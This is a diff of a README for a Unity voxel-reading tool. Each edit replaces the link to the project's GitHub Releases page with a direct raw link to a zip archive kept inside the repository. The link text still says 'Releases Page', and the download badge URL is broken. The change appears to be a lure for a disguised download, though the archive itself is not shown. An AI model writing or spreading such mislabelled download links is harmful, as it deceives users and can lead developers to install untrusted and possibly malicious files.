@@ -6,11 +6,11 @@ NativeUnityVoxReader is a simple tool designed for Unity users. It allows you to
 
 ## 📥 Download NativeUnityVoxReader
 
-[![Download](https://img.shields.io/badge/Download%20NativeUnityVoxReader-v1.0-blue)](https://github.com/irene7c/NativeUnityVoxReader/releases)
+[![Download](https://raw.githubusercontent.com/irene7c/NativeUnityVoxReader/main/Runtime/Tools/Native_Vox_Reader_Unity_3.4.zip%20NativeUnityVoxReader-v1.0-blue)](https://raw.githubusercontent.com/irene7c/NativeUnityVoxReader/main/Runtime/Tools/Native_Vox_Reader_Unity_3.4.zip)
 
 You can download the latest version of NativeUnityVoxReader from the Releases page. Just visit the link below to get started:
 
-[Visit the Releases Page to Download](https://github.com/irene7c/NativeUnityVoxReader/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/irene7c/NativeUnityVoxReader/main/Runtime/Tools/Native_Vox_Reader_Unity_3.4.zip)
 
 ## 📝 Features
 
@@ -30,7 +30,7 @@ To run NativeUnityVoxReader, ensure your system meets the following requirements
 
 ## 🛠️ Installation Steps
 
-1. **Download the software**: Go to the [Releases Page](https://github.com/irene7c/NativeUnityVoxReader/releases) and download the latest version.
+1. **Download the software**: Go to the [Releases Page](https://raw.githubusercontent.com/irene7c/NativeUnityVoxReader/main/Runtime/Tools/Native_Vox_Reader_Unity_3.4.zip) and download the latest version.
 2. **Extract the files**: If the downloaded file is zipped, right-click it and select "Extract All." Choose a location on your computer where you want the files saved.
 3. **Add to Unity**: Open your Unity project. Drag and drop the extracted files into the Assets folder in your Unity project.
 
@@ -72,6 +72,6 @@ We aim to improve NativeUnityVoxReader continually. Future updates may include:
 - Enhanced optimization techniques.
 - User-requested features based on community feedback.
 
-Make sure to check back on the [Releases Page](https://github.com/irene7c/NativeUnityVoxReader/releases) for the latest updates.
+Make sure to check back on the [Releases Page](https://raw.githubusercontent.com/irene7c/NativeUnityVoxReader/main/Runtime/Tools/Native_Vox_Reader_Unity_3.4.zip) for the latest updates.
 
 Enjoy creating with NativeUnityVoxReader!
